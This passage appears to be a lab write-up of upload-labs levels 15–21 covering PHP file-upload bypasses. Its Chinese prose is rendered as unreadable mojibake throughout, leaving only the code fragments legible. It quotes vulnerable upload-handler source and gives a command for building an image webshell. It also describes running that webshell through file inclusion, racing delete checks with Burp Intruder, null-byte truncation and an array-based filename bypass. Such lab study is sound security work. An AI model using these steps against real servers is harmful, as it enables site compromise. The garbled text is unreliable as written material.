https://blog.csdn.net/LiuBuZhuDeFanHua/article/details/82949144 è¿™é‡Œæ˜¯ä¸€äº›å›¾ç‰‡æ–‡ä»¶å¤´ä»¥åŠè§£ç  æŸ¥é˜…äº†ä¸€äº›èµ„æ–™ä»¥åå‘ç°ï¼šæ•°æ®é€šä¿¡(é€šè¿‡äºŒè¿›åˆ¶æ ¼å¼ä¸å…¶å®ƒè¯­è¨€é€šä¿¡)æ•°æ®åŠ å¯†(å¦‚æœä¸å‘Šè¯‰ç¬¬ä¸‰æ–¹ä½ çš„æ‰“åŒ…æ–¹å¼ï¼Œå¯¹æ–¹è§£åŒ…çš„éš¾åº¦å°±ç›¸å¯¹å¾ˆå¤§)èŠ‚çœç©ºé—´(æ¯”å¦‚æ¯”è¾ƒå¤§çš„æ•°å­—æŒ‰å­—ç¬¦ä¸²å‚¨å­˜ä¼šæµªè´¹å¾ˆå¤šç©ºé—´ï¼Œæ‰“åŒ…æˆäºŒè¿›åˆ¶æ ¼å¼æ‰éœ€è¦4ä½&lt;32ä½æ•°å­—&gt; è§£é¢˜ï¼šå› ä¸ºä»–åªè¯»æ–‡æœ¬çš„å‰ä¸¤ä¸ªå­—èŠ‚æ¥åˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡å½¢å¼ï¼Œæˆ‘ä»¬å…ˆä¸Šä¼ å›¾ç‰‡ï¼Œçœ‹çœ‹å›¾ç‰‡çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ä»€ä¹ˆæ˜¯è¿™æ ·çš„ï¼Œé‚£æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå›¾ç‰‡é©¬è¯•è¯• https://blog.csdn.net/ltysg0645/article/details/53996658è¿™æ˜¯åˆ¶ä½œæ•™ç¨‹é“¾æ¥ï¼Œè¿™é‡Œé‡‡å–çš„æ˜¯ä½¿ç”¨cmdå‘½ä»¤ç¬¦çª—å£æŒ‡ä»¤åˆ¶ä½œçš„æ–¹å¼æŒ‡ä»¤æ˜¯ï¼š copy 1.png/b+1.php/a 12.png æ¥ä¸‹æ¥ä¸Šä¼ æ–‡ä»¶åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åœ¨inlude.phpç•Œé¢ï¼Œè¾“å…¥?file=è·¯å¾„+æ–‡ä»¶å è¿™æ ·å°±æ˜¯æˆåŠŸäº† æ–‡ä»¶åŒ…å«æ¼æ´https://www.freebuf.com/articles/web/182280.htmlåœ¨è¿™é‡Œå·²ç»è®²å¾—å¾ˆæ¸…æ¥šäº†ï¼Œå°±ä¸é‡å¤èµ˜è¿°äº†è¿™é‡Œç”¨æˆ‘çš„è¯è®²å°±æ˜¯ï¼š1.åœ¨PHPä¸­å«æœ‰require()require_once()include()include_once() è¿™å‡ ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½å¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„PHPä»£ç ç„¶åæˆ‘ä»¬å†æ¥åˆ†æä¸€ä¸‹æºç  getä¸€ä¸ªfileï¼Œå¦‚æœè¿™ä¸ªfileå­˜åœ¨å°±è¾“å‡ºfileçš„å†…å®¹ï¼ˆè¿™è¾¹ä½¿ç”¨äº†includeå‡½æ•°ï¼‰è€Œè¿™é‡Œä¸ºä»€ä¹ˆå›¾ç‰‡é‡Œçš„phpä»£ç èƒ½è¢«è§£æå‘¢ï¼ŸåŸå› æ˜¯ï¼Œåœ¨æ··åˆä»£ç html+phpçš„æ¡†æ¶ä¸‹ï¼Œ &lt;?php ?&gt; æ–‡ä»¶å†…åŒ…å«è¿™ä¸ªçš„å†…å®¹ä¼šè¢«è§£æå¹¶è¾“å‡ºç»“æœï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯PHPå†…å®¹çš„åˆ™ä¼šç›´æ¥åŸæ ·è¾“å‡ºã€‚ æ‹“å±•ï¼šwebæœåŠ¡å™¨çš„pathinfoæ¼æ´(æ–‡ä»¶è§£ææ¼æ´)æ–‡ä»¶è§£ææ¼æ´,æ˜¯æŒ‡Webå®¹å™¨ï¼ˆApacheã€Nginxã€IISç­‰ï¼‰åœ¨è§£ææ–‡ä»¶æ—¶å°†æ–‡ä»¶è§£ææˆè„šæœ¬æ–‡ä»¶æ ¼å¼å¹¶å¾—ä»¥æ‰§è¡Œè€Œäº§ç”Ÿçš„æ¼æ´ã€‚ä»è€Œ,é»‘å®¢å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®ç°éæ³•æ–‡ä»¶çš„è§£æã€‚ï¼ˆPS:å…¨ç§°æ˜¯Internetä¿¡æ¯æœåŠ¡ï¼ˆbaiInternet Information Serviceï¼ŒIISï¼‰ã€‚æ˜¯å¾®è½¯æä¾›çš„ä¸€ä¸ªzhiWebæœåŠ¡ç¨‹åºï¼Œåœ¨å¼€å‘ä¸­ç§°ä¹‹ä¸ºWebå®¹å™¨ï¼‰ webå®¹å™¨ï¼šwebå®¹å™¨æ˜¯ä¸€ç§æœåŠ¡ç¨‹åºï¼Œåœ¨æœåŠ¡å™¨ä¸€ä¸ªç«¯å£å°±æœ‰ä¸€ä¸ªæä¾›ç›¸åº”æœåŠ¡çš„ç¨‹åºï¼Œè€Œè¿™ä¸ªç¨‹åºå°±æ˜¯å¤„ç†ä»å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œå¦‚tomcatã€apacheã€nginxç­‰ã€‚(å¯ä»¥ç†è§£ä¸ºç¼–ç¨‹è¯­è¨€æä¾›ç¯å¢ƒ) upload-labs15æŸ¥çœ‹æºç ï¼Œå‘ç°ä»–è¿™æ¬¡ä½¿ç”¨äº†ä¸€ä¸ªgetimagesizeè·å–æ–‡ä»¶åç¼€ç±»å‹â€”â€”æ¥è‡ªèœé¸Ÿæ•™ç¨‹ä»–çš„æ¯ä¸ªåç¼€éƒ½å¯¹åº”ä¸€ä¸ªç¼–å·ï¼Œpngå¯¹åº”çš„å°±æ˜¯3è¿™ä¸ªæ—¶å€™å°±åœ¨æƒ³ï¼Œå¦‚æœä»–æœ‰å¤šä¸ªåç¼€å‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦çŸ¥é“getimagesizeä»–è¯»å–æ–‡ä»¶é’ˆå¯¹çš„æ˜¯æ–‡ä»¶å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ä»–ä¼šå¯¹ç›®æ ‡æ–‡ä»¶å†…å®¹è½¬åŒ–è€Œä¸º16è¿›åˆ¶å†å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œè€Œæ ¹æ®å‰é¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸åŒæ–‡ä»¶ç±»å‹ä»–çš„16è¿›åˆ¶æ˜¯ä¸åŒçš„ï¼Œåœ¨è¿™é¢˜å½“ä¸­ï¼Œæˆ‘æµ‹è¯•äº†.php.png .png.phpçš„åç¼€ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶çš„æœ¬è´¨æ˜¯å›¾ç‰‡å½¢å¼çš„ï¼Œä»–æœ€åä¸Šä¼ åæ˜¾ç¤ºå‡ºæ¥çš„åç¼€å³ä¸º.pngï¼ˆå›¾ç‰‡ï¼‰æ ¼å¼åç¼€çš„ï¼Œæˆ‘ä»¬çœ‹æºç ï¼Œä»–æœ€åä¿å­˜çš„è·¯å¾„ï¼Œæ–‡ä»¶åå³ä¸º çœ‹ä¸Šé¢è¿™ä¸ªå›¾ï¼Œä»–è¯´æ˜¯å‰é¢çš„åä½éšæœºæ•°+.$resçš„åç¼€ï¼Œè€Œè¿™ä¸ªåç¼€ï¼Œå°±æ˜¯æˆ‘ä»¬å‰é¢é€šè¿‡è¯»å–è¿™ä¸ªå›¾ç‰‡çš„åå…­è¿›åˆ¶å†…å®¹æ‰€å¾—åˆ°çš„ã€‚ æ‰€ä»¥è¿™é¢˜ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç›´æ¥ä½¿ç”¨å›¾ç‰‡é©¬çš„å½¢å¼ä¸Šä¼ å°±è¡Œï¼Œå› ä¸ºå›¾ç‰‡é©¬å‰é¢çš„å†…å®¹åˆšå¥½å¯ä»¥ç»•è¿‡è¿‡æ»¤ï¼ˆè¿˜æ˜¯å›¾ç‰‡ï¼‰ã€‚ç„¶åå…ˆç‚¹å‡»æŸ¥çœ‹å›¾ç‰‡ï¼Œçœ‹çœ‹è¿™ä¸ªéšæœºç”Ÿæˆçš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆçŸ¥é“ä»¥åå°±ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰“å¼€å³å¯ PSï¼šè¿™é‡Œæœ‰ä¸ªç¥å¥‡çš„ä¸œè¥¿åœ¨ä¸€å †ä¹±ç ä¸­å±…ç„¶æœ‰ä¸€ä¸ªå°æ˜Ÿæ˜Ÿï¼Œå“‡å“¦å“ˆå“ˆå“ˆå“ˆå“ˆ upload-labs16 é¦–å…ˆæ˜¯exit_imagetupe()å‡½æ•°ï¼š è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯ç”¨æ¥æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡ç±»å‹çš„ï¼Œå‡½æ•°è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œå¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚è¿”å›å€¼å’Œ getimagesize() çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œä½†è¯¥å‡½æ•°è¦å¿«å¾—å¤šã€‚ æ‰€ä»¥è¯´è¿˜æ˜¯å›¾ç‰‡é©¬çš„äº‹æƒ…å˜›~ ä¸Šä¼ å›¾ç‰‡é©¬ æˆåŠŸï¼Œè¿™é‡Œå°±ä¸æ”¾æˆªå›¾äº† upload-labs17è¿˜æ˜¯ä¾æ—§åˆ†æä¸€ä¸‹æºä»£ç  $is_upload = false;$msg = null;if (isset($_POST['submit'])){ // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; //basename($...)è·å–æ–‡ä»¶åï¼Œå¦‚æœæ˜¯base($...,&quot;php&quot;)ï¼Œè·å–æ— åç¼€çš„æ–‡ä»¶å $target_path=UPLOAD_PATH.'/'.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ï¼Œæ­¤å¤„å‘æŒ¥åŠŸèƒ½çš„æ˜¯imagecreatefromjpeg()å‡½æ•°ï¼Œå¹¶ä¸”è¦è®©è¿™ä¸ªå‡½æ•°å‘æŒ¥ä½œç”¨ï¼Œè¿˜éœ€å¼€å¯PHPç»„ä»¶ä¸­gd2 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; //è¿™é‡Œunlikeåˆ é™¤åŸæ–‡ä»¶ï¼ï¼ @unlink($target_path); }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); //è¿™é‡Œunlikeåˆ é™¤åŸæ–‡ä»¶ï¼ï¼ @unlink($target_path); $is_upload = true; } } else { $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; } imagecreatefromgif()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» GIF æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒimagecreatefromjpeg()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» JPEG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒimagecreatefrompng()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» PNG æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒimagecreatefromwbmp()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä» WBMP æ–‡ä»¶æˆ– URL åœ°å€è½½å…¥ä¸€å‰¯å›¾åƒimagecreatefromstring()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»å­—ç¬¦ä¸²ä¸­çš„å›¾åƒæµæ–°å»ºä¸€å‰¯å›¾åƒmove_uploaded_file() å‡½æ•°å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚ æœ‰å¤§ç¥è¯´ï¼šè¿™é‡Œmove_uploaded_fileå·²ç»å°†å›¾ç‰‡é©¬ä¸Šä¼ åˆ°æœåŠ¡å™¨å½“ä¸­äº†ï¼Œåé¢çš„äºŒæ¬¡æ¸²æŸ“æ˜¯ä¸å½±å“è¿™ä¸ªå›¾ç‰‡é©¬çš„ï¼Œæ‰€ä»¥è¯´å¯ä»¥ä¸ç®¡è¿™ä¸ªäºŒæ¬¡æ¸²æŸ“ï¼Œä½†æ˜¯ä»–åé¢æœ‰åˆ é™¤åŸæ–‡ä»¶çš„ä»£ç å‘€ï¼Œæœ€ç»ˆä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ï¼Œä¹Ÿå°±åªæœ‰äºŒæ¬¡æ¸²æŸ“çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿæä¸æ‡‚ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨move_uploaded_fileï¼ŸåŸå› å°±æ˜¯ä»–å°†ç¬¬ä¸€ä¸ª @unlink($target_path); ç»™åˆ é™¤äº† æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¼€å§‹è§£é¢˜å§ï¼šç½‘ä¸Šè¯´gifçš„å›¾æ¯”è¾ƒå¥½è¿‡ æ‰€ä»¥æˆ‘ä»¬å°±ç…§ä¸€å¼ gifå¯¹æ¯”æˆ‘ä»¬çš„åŸå›¾ç‰‡ï¼Œå‘ç°æ˜¯è¿™ä¸ªä½ç½®çš„æ•°æ®æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å°†æœ¨é©¬æ’åœ¨è¿™é‡Œï¼Œåé¢ç»§ç»­åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å³å¯ upload-labs18$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; //in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚ //rename() å‡½æ•°é‡å‘½åæ–‡ä»¶æˆ–ç›®å½• if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); } }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; }} è¿™ä¸€å…³éœ€è¦ä»£ç å®¡è®¡ï¼Œé‚£å°±è®©æˆ‘ä»¬åº·åº·ä»£ç å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å¦å­˜åœ¨ç™½åå•åç¼€ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œå°±ä¿ç•™ä¸‹æ¥ï¼Œåä¹‹å°±ä½¿ç”¨unlinkåˆ é™¤è¿™ä¸ªæ–‡ä»¶ã€‚è¿™é¢˜è€ƒçš„æ˜¯æ¡ä»¶ç«äº‰ æ¡ä»¶ç«äº‰æ¼æ´:æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚ æ‰€ä»¥è§£é¢˜æ–¹å‘å°±æ˜¯ï¼Œåœ¨ä¸Šä¼ ä»¥åå‚¨å­˜åœ¨æœåŠ¡å™¨ï¼Œåˆ°æ£€æŸ¥ä¸é€šè¿‡çš„è¿™æ®µæ—¶é—´å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨èµ·æ¥ï¼Œå°±ç®—åç»­ä»–å°†æ–‡ä»¶åˆ é™¤äº†ä¹Ÿæ— æ‰€è°“ï¼Œé‚£ä¹ˆè¿™æ®µæ—¶é—´å¤ªçŸ­äº†ï¼Œå¦‚ä½•å°†å…¶æ”¾å¤§ï¼Ÿé‚£å°±åˆ©ç”¨burpçš„intruderï¼Œéšä¾¿å¼„ä¸€ä¸ªpeyloadè®©ä»–åœ¨é‚£è¾¹è·‘å°±è¡Œï¼Œç„¶åæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ åœ¨è§‚å¯Ÿæ–‡ä»¶å†æ–‡ä»¶å¤¹çš„çŠ¶æ€æ—¶ ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210118122943.png) ä¾¿å‘ç°ä»–ä¸€ç›´å¤„äºåˆ é™¤æ¢å¤çš„çŠ¶æ€ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œburpçš„çº¿ç¨‹éœ€è¦è®¾ç½®å¾—å¤§ä¸€äº›ã€‚ æ‹“å±•å‚æ•°æ±¡æŸ“æ¼æ´HTTPå‚æ•°æ±¡æŸ“ï¼Œä¹Ÿå«HPPï¼ˆHTTP Parameter Pollutionï¼‰ã€‚ç®€å•åœ°è®²å°±æ˜¯ç»™ä¸€ä¸ªå‚æ•°èµ‹ä¸Šä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å€¼ï¼Œç”±äºç°è¡Œçš„HTTPæ ‡å‡†æ²¡æœ‰æåŠåœ¨é‡åˆ°å¤šä¸ªè¾“å…¥å€¼ç»™ç›¸åŒçš„å‚æ•°èµ‹å€¼æ—¶åº”è¯¥æ€æ ·å¤„ç†ï¼Œè€Œä¸”ä¸åŒçš„ç½‘ç«™åç«¯åšå‡ºçš„å¤„ç†æ–¹å¼æ˜¯ä¸åŒçš„ï¼Œä»è€Œé€ æˆè§£æé”™è¯¯ã€‚å³é’ˆå¯¹å¤šä¸ªè¯·æ±‚ï¼Œ å¤„ç†æ–¹å¼ä¸åŒHPPæ¼æ´çš„äº§ç”ŸåŸå› ä¸€æ–¹é¢æ¥è‡ªæœåŠ¡å™¨å¤„ç†æœºåˆ¶çš„ä¸åŒï¼Œå¦ä¸€æ–¹é¢æ¥è‡ªå¼€å‘äººå‘˜åç«¯æ£€æµ‹é€»è¾‘çš„é—®é¢˜ã€‚HTTP å‚æ•°æ±¡æŸ“çš„é£é™©å®é™…ä¸Šå–å†³äºåç«¯æ‰€æ‰§è¡Œçš„æ“ä½œï¼Œä»¥åŠè¢«æ±¡æŸ“çš„å‚æ•°æäº¤åˆ°äº†å“ªé‡Œã€‚æ€»ä½“ä¸ŠHPPä¸€èˆ¬æœ‰ä¸¤ç§åˆ©ç”¨åœºæ™¯ï¼š 1ï¼‰é€»è¾‘æ¼æ´ï¼Œé€šå¸¸ä¼šé€ æˆIDORï¼Œä¿¡æ¯æ³„éœ²ï¼Œè¶Šæƒç­‰æ¼æ´; 2ï¼‰ä½œä¸ºå…¶ä»–æ¼æ´çš„è¾…åŠ©ï¼Œç”¨äºç»•è¿‡æ¼æ´çš„æ£€æµ‹å’ŒWafç­‰ã€‚è¿™ä¸ªæ¼æ´å…¶å®ä¹‹å‰åœ¨sql-labsçš„æ—¶å€™å°±æœ‰é‡åˆ°è¿‡äº†ã€‚å‚è€ƒæ–‡ç« https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&amp;mid=2247483892&amp;idx=1&amp;sn=bf1b7c8e6242a5b6c3ef2f6169df308b&amp;chksm=eac0b3c9ddb73adfac67da0512b172dbe0a4eda1fab4108646e9e3d714f9a72b927d259ed307&amp;scene=21#wechat_redirect upload-labs19è¿™ä¸€å…³ä»–è®©æˆ‘ä»¬ä»£ç å®¡è®¡ï¼Œå‘ç° $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } æœ¬å…³å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸ upload-labs20if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); //pathinfoå°†æ–‡ä»¶ä¿¡æ¯ä»¥æ•°ç»„çš„å½¢å¼è¿”å›ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯åç¼€ if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } }else{ $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }} åˆ†ææºç ï¼šä»–æ˜¯è¿™æ ·çš„ï¼Œæ¯”å¯¹é»‘åå•ï¼Œå¦‚æœåç¼€å’Œé»‘åå•é‡Œçš„ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå°±ç¦æ­¢ä¿å­˜ï¼Œå¦‚æœä¸€æ ·ï¼Œåˆ™å°†æ–‡ä»¶åä¿å­˜ä¸ºä¸Šä¼ æ—¶çš„æ–‡ä»¶çš„æ–‡ä»¶åï¼ˆè¿™æ˜¯æœ‰åˆ†æ­¥éª¤çš„ï¼‰ã€‚è¿™é‡Œå°±éœ€è¦ç”¨åˆ°æˆ‘ä»¬ä¹‹å‰çœ‹è¿‡çš„move_uploaded_file()æˆªæ–­æ¼æ´æ€è·¯ï¼šä¸Šä¼ ä¸€ä¸ªjpgæ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpä»£ç ï¼Œå†ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼Œç”±äºæœ€åä¿å­˜çš„æ–‡ä»¶åæˆ‘ä»¬å¯æ§ï¼Œæ ¹æ®æ¼æ´ï¼Œå°†.jpgæˆªæ–­å³ï¼š upload-labs21åœ¨è¿™ä¸€å…³ä¸­éœ€è¦ä»£ç å®¡è®¡å¯ä»¥çœ‹åˆ°åé¢ if (!in_array($ext, $allow_suffix)) { $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; } else { $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; å‰é¢çš„è¿‡æ»¤ç»•è¿‡ä¼¼ä¹éƒ½æ²¡æœ‰å¤šå¤§æ„ä¹‰ï¼Œæ¯•ç«Ÿåé¢è¿˜æœ‰ç™½åå•ï¼Œä½†æ˜¯è¿™ä¸ªåˆ¤æ–­æ¡ä»¶å°±å¾ˆå¥‡æ€ªï¼Œå¦‚æœä¸æ˜¯æ•°ç»„ç±»å‹ï¼Œåˆ™æ‰§è¡Œæ­¤åˆ¤æ–­ï¼Œåä¹‹å°±ä¸æ‰§è¡Œäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿé‚£æˆ‘ä»¬å°±å°†æ–‡ä»¶å®šåå˜æˆæ•°ç»„æ€ä¹ˆå¼„å‘¢ï¼Ÿå…ˆå¾€ä¸‹çœ‹ï¼Œä»–æ–‡ä»¶çš„å‘½åä¹Ÿå¾ˆæœ‰è¶£1.reset()å‡½æ•°ï¼šæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ 2.count()è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•°3.end()æœ€åä¸€ä¸ªå…ƒç´ çš„å€¼4.explode() å‡½æ•°ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚æ¥ä¸‹æ¥è®©æˆ‘ä»¬é€ä¸ªç ´è§£ï¼šå®ƒå…ˆå°†fileåˆ†å‰²æˆä¸€ä¸ªä¸ªæ•°ç»„ï¼Œå‡è®¾ä¸º1.phpé‚£ä¹ˆæ•°ç»„ä¸ºfile[0]=1 file[1]=phpä¸ºäº†ç»•è¿‡ç™½åå•é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘½åä¸º1.php.jpgæ¥ä¸‹æ¥æ˜¯.phpæœ€ä¸ºåç¼€ï¼Œ1ä½œä¸ºå‰ç¼€å˜æˆæ–°æ–‡ä»¶çš„æ–‡ä»¶å è¿™æ ·å¥½åƒå¯è¡Œï¼Ÿï¼Ÿè¯•è¯•ï¼Œä¸è¡Œè¯¶ï¼Œå†æ¥æ€è€ƒä¸€ä¸‹ï¼š1.count()è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„ä¸ªæ•° 